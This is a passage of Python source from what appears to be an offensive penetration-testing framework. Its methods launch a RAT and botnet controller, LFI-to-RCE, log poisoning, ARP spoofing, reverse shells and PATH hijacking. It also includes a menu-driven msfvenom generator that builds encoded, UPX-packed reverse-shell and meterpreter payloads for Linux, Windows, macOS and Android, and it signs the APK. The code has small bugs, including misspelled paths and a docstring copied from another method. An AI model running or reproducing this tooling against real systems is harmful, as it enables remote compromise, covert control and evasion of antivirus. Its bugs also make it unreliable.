        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        """
        Run the internal module located at `modules/lazybotnet.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, hardcoded to "0.0.0.0".
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`. The `rhost` is hardcoded to "0.0.0.0".
        2. Checks if all required parameters (`rport` and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotnet.py` script with the appropriate arguments.

        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are set in `self.params`.
        2. The script `modules/lazybotnet.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazybotnet.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazybotnet` with `rport` set to `1234` and `rat_key` set to `my_key`, set:
            `self.params["rport"] = 1234`
            `self.params["rat_key"] = "my_key"`
            Then call:
            `run_lazybotnet()`

        Note:
            - Ensure that `modules/lazybotnet.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        """
        Run the internal module located at `modules/lazylfi2rce.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `field`: The field name for the LFI (Local File Inclusion) attack, specified in `self.params`.
        - `wordlist`: The path to the wordlist file used for the attack, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` from `self.params`.
        2. Checks if all required parameters are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylfi2rce.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param field: The field name for the LFI attack.
        :type field: str
        :param wordlist: The path to the wordlist file.
        :type wordlist: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` are set in `self.params`.
        2. The script `modules/lazylfi2rce.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazylfi2rce.py --rhost <rhost> --rport <rport> --lhost <lhost> --lport <lport> --field <field> --wordlist <wordlist>`

        Example:
            To run the lazylfi2rce with `rhost` set to `192.168.1.1`, `rport` set to `80`, `lhost` set to `192.168.1.2`, `lport` set to `8080`, `field` set to `file`, and `wordlist` set to `path/to/wordlist.txt`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["rport"] = 80`
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["lport"] = 8080`
            `self.params["field"] = "file"`
            `self.params["wordlist"] = "path/to/wordlist.txt"`
            Then call:
            `run_lazylfi2rce()`

        Note:
            - Ensure that `modules/lazylfi2rce.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print_error("rhost and rport field and lhost lport wordlist must be set")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        """
        Run the internal module located at `modules/lazylogpoisoning.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost` and `lhost` from `self.params`.
        2. Checks if the required parameters `rhost` and `lhost` are set. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylogpoisoning.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host. Must be set in `self.params`.
        :type rhost: str
        :param lhost: The IP address of the local host. Must be set in `self.params`.
        :type lhost: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `lhost` are set in `self.params`.
        2. The script `modules/lazylogpoisoning.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazylogpoisoning.py --rhost <rhost> --lhost <lhost>`

        Example:
            To run the lazylogpoisoning with `rhost` set to `192.168.1.1` and `lhost` set to `192.168.1.2`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["lhost"] = "192.168.1.2"`
            Then call:
            `run_lazylogpoisoning()`

        Note:
            - Ensure that `modules/lazylogpoisoning.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print_error("rhost and lhost must be set")
            return
        self.run_script(
            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
        )

    def run_lazybotcli(self):
        """
        Run the internal module located at `modules/lazybotcli.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host (default is `"0.0.0.0"`).
        - `rport`: The port number to be used, specified in `self.params`.
        - `rat_key`: The key for the Remote Access Tool (RAT), specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`.
        2. Checks if the required parameters `rport` and `rat_key` are set. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotcli.py` script with the appropriate arguments.

        :param rport: The port number for the connection. Must be set in `self.params`.
        :type rport: int
        :param rat_key: The key for the RAT. Must be set in `self.params`.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are set in `self.params`.
        2. The script `modules/lazybotcli.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazybotcli.py --host 0.0.0.0 --port <rport> --key <rat_key>`

        Example:
            To run the lazybotcli with port `12345` and key `mysecretkey`, set:
            `self.params["rport"] = 12345`
            `self.params["rat_key"] = "mysecretkey"`
            Then call:
            `run_lazybotcli()`

        Note:
            - Ensure that `modules/lazybotcli.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        """
        Run the internal module located at `modules/lazybrutesshuserenum.py` with the specified parameters. ONLY valid for 7.x Version !!!

        The script will be executed with the following arguments:

        - `wordlist`: The path to the wordlist file containing potential usernames for SSH enumeration.
        - `rhost`: The target IP address or hostname for SSH enumeration.

        The function performs the following steps:

        1. Retrieves the values for `wordlist` and `rhost` from `self.params`.
        2. Prints a warning message about the potential inaccuracy of the results.
        3. Constructs the command to run the `lazybrutesshuserenum.sh` script with the specified arguments.
        4. Executes the command using the `os.system` method.

        :param wordlist: The path to the wordlist file for username enumeration. Must be set in `self.params`.
        :type wordlist: str
        :param rhost: The target IP address or hostname for SSH enumeration. Must be set in `self.params`.
        :type rhost: str

        :returns: None

        Manual execution:
        1. Ensure that `wordlist` and `rhost` are set in `self.params`.
        2. Run the script `modules/lazybrutesshuserenum.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazybrutesshuserenum.sh` must be present in the `modules` directory and must be executable.

        Example:
            To run the SSH user enumeration with a wordlist located at `/path/to/wordlist.txt` and target IP `192.168.1.1`, set:
            `self.params["usrwordlist"] = "/path/to/wordlist.txt"`
            `self.params["rhost"] = "192.168.1.1"`
            Then call:
            `run_lazyssh77enum()`

        Note:
            - The accuracy of the results may vary depending on the version of the script and the wordlist used.
        """

        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print_error("rhost and wordlist must be set")
            return
        print_warn(
            "this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        os.system(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        """
        Run the internal module located at `modules/lazyown_burpfuzzer.py` with the specified parameters.

        The script will be executed with the following arguments:

        - `--url`: The target URL for the fuzzer.
        - `--method`: The HTTP method to use (e.g., GET, POST).
        - `--proxy_port`: The port for the proxy server.
        - `--headers`: Optional HTTP headers to include in the request.
        - `--data`: Optional data to include in the request body.
        - `--params`: Optional URL parameters to include in the request.
        - `--json_data`: Optional JSON data to include in the request body.
        - `-w`: Optional wordlist for fuzzing.
        - `-hc`: Optional hide code for fuzzing.

        The function performs the following steps:

        1. Retrieves the values for `url`, `method`, `headers`, `params`, `data`, `json_data`, `proxy_port`, `wordlist`, and `hide_code` from `self.params`.
        2. Constructs the command to run the `lazyown_burpfuzzer.py` script with the specified arguments.
        3. Adds optional parameters based on whether the corresponding files (`headers_file`, `data_file`, `params_file`, `json_data_file`) are provided.
        4. Executes the command using the `run_command` method.

        :param url: The target URL for the fuzzer. Must be set in `self.params`.
        :type url: str
        :param method: The HTTP method to use. Must be set in `self.params`.
        :type method: str
        :param headers: Optional HTTP headers. Must be set in `self.params` or provided via `headers_file`.
        :type headers: str
        :param params: Optional URL parameters. Must be set in `self.params` or provided via `params_file`.
        :type params: str
        :param data: Optional data for the request body. Must be set in `self.params` or provided via `data_file`.
        :type data: str
        :param json_data: Optional JSON data for the request body. Must be set in `self.params` or provided via `json_data_file`.
        :type json_data: str
        :param proxy_port: The port for the proxy server. Must be set in `self.params`.
        :type proxy_port: int
        :param wordlist: Optional wordlist for fuzzing. Must be set in `self.params`.
        :type wordlist: str
        :param hide_code: Optional code to hide. Must be set in `self.params`.
        :type hide_code: int
        :param headers_file: Optional file containing headers.
        :type headers_file: str, optional
        :param data_file: Optional file containing data.
        :type data_file: str, optional
        :param params_file: Optional file containing parameters.
        :type params_file: str, optional
        :param json_data_file: Optional file containing JSON data.
        :type json_data_file: str, optional

        :returns: None

        Manual execution:
        1. Ensure that `url`, `method`, and `proxy_port` are set in `self.params`.
        2. Provide additional parameters as needed.
        3. Run the script `modules/lazyown_burpfuzzer.py` with the appropriate arguments.

        Dependencies:
        - `modules/lazyown_burpfuzzer.py` must be present in the `modules` directory and must be executable.

        Example:
            To run the fuzzer with URL `http://example.com`, HTTP method `POST`, and proxy port `8080`, set:
            `self.params["url"] = "http://example.com"`
            `self.params["method"] = "POST"`
            `self.params["proxy_port"] = 8080`
            Then call:
            `run_lazyburpfuzzer()`

        Note:
            - Ensure that all required parameters are set before calling this function.
            - Parameters can also be provided via corresponding files.
        """

        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)
        return

    def run_lazyreverse_shell(self):
        """
        Run the internal module located at `modules/lazyreverse_shell.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--ip`: The IP address to use for the reverse shell.
        - `--puerto`: The port to use for the reverse shell.

        The function performs the following steps:

        1. Retrieves the values for `rhost` (IP address) and `reverse_shell_port` (port) from `self.params`.
        2. Validates that `rhost` and `reverse_shell_port` parameters are set.
        3. Constructs the command to run the `lazyreverse_shell.sh` script with the specified arguments.
        4. Executes the command.

        :param ip: The IP address to use for the reverse shell. Must be set in `self.params`.
        :type ip: str
        :param port: The port to use for the reverse shell. Must be set in `self.params`.
        :type port: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `reverse_shell_port` are set in `self.params`.
        2. Run the script `modules/lazyreverse_shell.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyreverse_shell.sh` must be present in the `modules` directory and must be executable.

        Example:
            To set up a reverse shell with IP `192.168.1.100` and port `4444`, set:
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["reverse_shell_port"] = "4444"`
            Then call:
            `run_lazyreverse_shell()`

        Note:
            - Ensure that `modules/lazyreverse_shell.sh` has the necessary permissions to execute.
            - Parameters must be set before calling this function.
        """

        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print_error(
                "rhost and reverse_shell_port must be set, more info see, help set"
            )
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
        return

    def run_lazyarpspoofing(self):
        """
        Run the internal module located at `modules/lazyarpspoofing.py` with the specified parameters.

        The script will be executed with the following arguments:
        - `--device`: The network interface to use for ARP spoofing.
        - `lhost`: The local host IP address to spoof.
        - `rhost`: The remote host IP address to spoof.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `rhost`, and `device` from `self.params`.
        2. Validates that `lhost`, `rhost`, and `device` parameters are set.
        3. Constructs the command to run the `lazyarpspoofing.py` script with the specified arguments.
        4. Executes the command.

        :param lhost: The local host IP address to spoof. Must be set in `self.params`.
        :type lhost: str
        :param rhost: The remote host IP address to spoof. Must be set in `self.params`.
        :type rhost: str
        :param device: The network interface to use for ARP spoofing. Must be set in `self.params`.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `rhost`, and `device` are set in `self.params`.
        2. Run the script `modules/lazyarpspoofing.py` with the appropriate arguments.

        Dependencies:
        - `modules/lazyarpspoofing.py` must be present in the `modules` directory and must be executable.

        Example:
            To execute ARP spoofing with local host `192.168.1.2`, remote host `192.168.1.1`, and device `eth0`, set:
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyarpspoofing()`

        Note:
            - Ensure that `modules/lazyarpspoofing.py` has the necessary permissions to execute.
            - Parameters must be set before calling this function.
        """

        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print_error("lhost, lhost, and device must be set")
            return
        os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")
        return

    def run_lazyattack(self):
        """
        Run the internal module located at `modules/lazyatack.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--modo`: The mode of the attack.
        - `--ip`: The target IP address.
        - `--atacante`: The attacker IP address.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Validates that `mode`, `rhost`, and `lhost` parameters are set.
        3. Constructs the command to run the `lazyatack.sh` script with the specified arguments.
        4. Executes the command.

        :param mode: The mode in which the attack should be run. Must be set in `self.params`.
        :type mode: str
        :param target_ip: The IP address of the target. Must be set in `self.params`.
        :type target_ip: str
        :param attacker_ip: The IP address of the attacker. Must be set in `self.params`.
        :type attacker_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `mode`, `rhost`, and `lhost` are set in `self.params`.
        2. Run the script `modules/lazyatack.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyatack.sh` must be present in the `modules` directory and must be executable.

        Example:
            To execute the attack with mode `scan`, target IP `192.168.1.100`, and attacker IP `192.168.1.1`, set:
            `self.params["mode"] = "scan"`
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["lhost"] = "192.168.1.1"`
            Then call:
            `run_lazyattack()`

        Note:
            - Ensure that `modules/lazyatack.sh` has the necessary permissions to execute.
            - Parameters must be set before calling this function.
        """

        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print_error("mode, rhost, and lhost must be set, more info see help set")
            return
        os.system(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )
        return

    def run_lazymsfvenom(self):
        """
        Executes the `msfvenom` tool to generate a variety of payloads based on user input.

        This function prompts the user to select a payload type from a predefined list and runs the corresponding
        `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
        payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

        The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
        the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
        the function will also sign the APK and perform necessary post-processing steps.

        :param line: Command line arguments for the script.
        :return: None
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lhost or not lport:
            print_error("lport and lhost must be set")
            return

        # Prompt user for choice
        print_msg("Select payload type:")
        print_msg("1: linux/x86/meterpreter/reverse_tcp")
        print_msg("2: linux/x64/meterpreter/reverse_tcp")
        print_msg("3: windows/meterpreter/reverse_tcp")
        print_msg("4: windows/x64/meterpreter/reverse_tcp")
        print_msg("5: osx/x86/meterpreter/reverse_tcp")
        print_msg("6: osx/x64/meterpreter/reverse_tcp")
        print_msg("7: linux/x86/shell_reverse_tcp")
        print_msg("8: linux/x64/shell_reverse_tcp")
        print_msg("9: windows/shell_reverse_tcp")
        print_msg("10: windows/x64/shell_reverse_tcp")
        print_msg("11: osx/x86/shell_reverse_tcp")
        print_msg("12: osx/x64/shell_reverse_tcp")
        print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
        print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
        print_msg("15: android/meterpreter/reverse_tcp")
        print_msg("16: java/jsp_shell_reverse_tcp")
        print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
        choice = input("Enter your choice (1-17): ").strip()

        # Define payload commands
        commands = {
            "1": f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "2": f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "3": f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "4": f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "5": f'msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "6": f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "7": f'msfvenom -p linux/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "8": f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "9": f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "10": f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "11": f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "13": (
                f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > payload.c'
            ),
            "14": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
            ),
            "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
            "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
            "17": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
            )
        }

        # Check if the choice is valid
        if choice in commands:
            # Execute the chosen command
            if choice == '14':
                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
                print_warn("esperando payload shell.exe ")
                time.sleep(15)
                print_warn("codificando payload shell_encoded.exe ")
            os.system(commands[choice])
            os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
            print_msg(f"Generated payload: {commands[choice]}")
            if choice == '15':
                os.system("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
                if not is_binary_present("jarsigner"):
                    print_warn("jarsigner is not present in the system, installing...")
                    os.system("sudo apt-get install openjdk-11-jdk-headless")
                os.system("sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi")
                os.system("sudo jarsigner -verify -verbose -certs sessions/shell.apk")
                if not is_binary_present("zipalign"):
                    print_warn("zipalign is not presetn in the system, installing...")
                    os.system("sudo apt-get install zipalign")
                os.system("zipalign -v 4 sessios/shell.apk signed_shell.apk")

            # Move and set permissions for the generated payload
            if choice in commands:
                os.system("mkdir -p sessions")
                os.system(
                    "mv shell* sessions 2>/dev/null"
                )  # Move files and suppress errors if no files match
                os.system("chmod +x sessions/shell*")

            print_msg("Payloads moved to sessions/")

            # Apply UPX to compress the payloads if applicable
            if choice in ["1", "2", "7", "8"]:
                if os.path.exists("sessions/shell.elf"):
                    os.system("upx sessions/shell.elf")
                if os.path.exists("sessions/shell64.elf"):
                    os.system("upx sessions/shell64.elf")
            if choice in ["3", "4", "9", "10", "14"]:
                if os.path.exists("sessions/shell.exe"):
                    os.system("upx sessions/shell.exe")
                if os.path.exists("sessions/shell64.exe"):
                    os.system("upx sessions/shell64.exe")
                if os.path.exists("sessions/shell64_encoded.exe"):
                    os.system("upx sessions/shell64_encoded.exe")
            if choice in ["5", "6", "11", "12"]:
                if os.path.exists("sessions/shell.macho"):
                    os.system("upx sessions/shell.macho")
                if os.path.exists("sessions/shell64.macho"):
                    os.system("upx sessions/shell64.macho")
            if choice == "13":
                # Handle the payload in C (shikata_ga_nai)
                if os.path.exists("payload.c"):
                    print_msg("Payload in C generated: payload.c")
                    os.system(
                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
                    )
                    print_msg(
                        f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
                    )

        else:
            print_error("Invalid choice. Please select a number between 1 and 15.")

    def run_lazyaslrcheck(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack. It should be set in `self.params` before calling this method.
        :type binary_name: str

        :returns: None

        Manual execution:
        1. Ensure that `binary_name` is set in `self.params`.
        2. Append the binary name to `modules/tmp.sh`.
        3. Copy `modules/tmp.sh` to `/tmp/{binary_name}`.
        4. Set executable permissions on the copied file.
        5. Update the PATH environment variable to prioritize `/tmp`.

        Dependencies:
        - The `self.params` dictionary must contain a valid `binary_name`.
        - Ensure that `modules/tmp.sh` exists and contains appropriate content for the attack.

        Example:
            To execute the path hijacking attack with `binary_name` as `malicious`, ensure `self.params["binary_name"]` is set to `"malicious"`, and then call:
            `run_lazypathhijacking()`

        Note:
            - The `binary_name` parameter must be a string representing the name of the binary to hijack.
            - The method modifies the PATH environment variable, which may affect the execution of other binaries.
        """


        print_msg(
            f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print_msg(result)
        if result == "0":
            print_error(f"    {GREEN}[+] ASLR is {RED}deactivated{RESET}")
        elif result == "1":
            print_warn(f"    {GREEN}[+] ASLR is partial {YELLOW}activated{RESET}")
        elif result == "2":
            print_msg(f"    {GREEN}[+] ASLR is activated{RESET}")
        return

    def run_lazypathhijacking(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack.
        :returns: None
        """

        binary_name = self.params["binary_name"]
        if not binary_name:
            print_msg("binary_name must be set")
            return

        os.system(f"echo {binary_name} >> modules/tmp.sh")
        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
        os.system(f"chmod +x /tmp/{binary_name}")
        os.system("export PATH=/tmp:$PATH")

        print_msg(f"echo {binary_name} >> modules/tmp.sh")
        print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
        print_msg(f"chmod +x /tmp/{binary_name}")
        print_msg("export PATH=/tmp:$PATH")

        print_msg(
            f"Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
        )
        return

    def run_script(self, script_name, *args):
        """Run a script with the given arguments

        This method constructs and executes a command to run a Python script with the specified arguments. It uses the `run_command` method to execute the script and handle real-time output.

        :param script_name: The name of the script to be executed.
        :type script_name: str
        :param args: The arguments to be passed to the script.
        :type args: tuple of str

        :returns: None

        Manual execution:
        1. Build the command list with "python3", the script name, and the arguments.
        2. Call `run_command` with the constructed command list.

        Dependencies:
        - `run_command` method for executing the constructed command and streaming output.

        Example:
            To execute a script named `example.py` with arguments `arg1` and `arg2`, call:
            `run_script("example.py", "arg1", "arg2")`

        Note:
            - The `script_name` parameter should be a string representing the name of the script.
            - The `args` parameter is a variable-length argument list containing the arguments to be passed to the script.
            - Ensure that the script and arguments are properly specified.
        """

        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time

        This method executes a given command using `subprocess.Popen` and streams both the standard output and standard error to the console in real-time. The output from both streams is appended to the `self.output` attribute. If interrupted, the process is terminated gracefully.

        :param command: The command to be executed.
        :type command: str

        :returns: None

        Manual execution:
        1. Execute the command specified by the `command` parameter.
        2. Stream and print the command's standard output and error to the console in real-time.
        3. Append all output to the `self.output` attribute.
        4. Handle `KeyboardInterrupt` by terminating the process and printing an error message.

        Dependencies:
        - `subprocess` module for running the command and capturing output.
        - `print_msg` function for printing output to the console.
        - `print_error` function for printing error messages to the console.

        Example:
            To execute a command, call `run_command("ls -l")`.

        Note:
            - The `command` parameter should be a string representing the command to be executed.
            - `self.output` must be initialized before calling this method.
            - Ensure proper exception handling to manage process interruptions.
        """

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line  # Agregar la salida a la variable self.output
                print_msg(line, end="")
            for line in iter(process.stderr.readline, ""):
                self.output += line  # Agregar la salida de stderr también
                print_msg(line, end="")
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print_error("[Interrupted] Process terminated")

    def do_payload(self, line):
        """Load parameters from a specified payload JSON file.

        This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.

        Usage:
            payload <filename>

        :param line: The name of the JSON file to load.
        :type line: str

        :returns: None

        Manual execution:
        1. Open and read the specified JSON file.
        2. Update the `params` dictionary with values from the JSON file.
        3. Print a success message if the parameters were successfully loaded.
        4. Handle `FileNotFoundError` if the file does not exist.
        5. Handle `JSONDecodeError` if there is an error decoding the JSON file.

        Dependencies:
        - `json` module for reading and parsing the JSON file.

        Example:
            To execute the function, call `payload payload_10.10.10.10.json`.

        Note:
            - Ensure that the specified JSON file exists in the current directory and is properly formatted.
            - The confirmation message includes color formatting for better visibility.
        """

        filename = line.strip() or "payload.json"

        try:
            with open(filename, "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
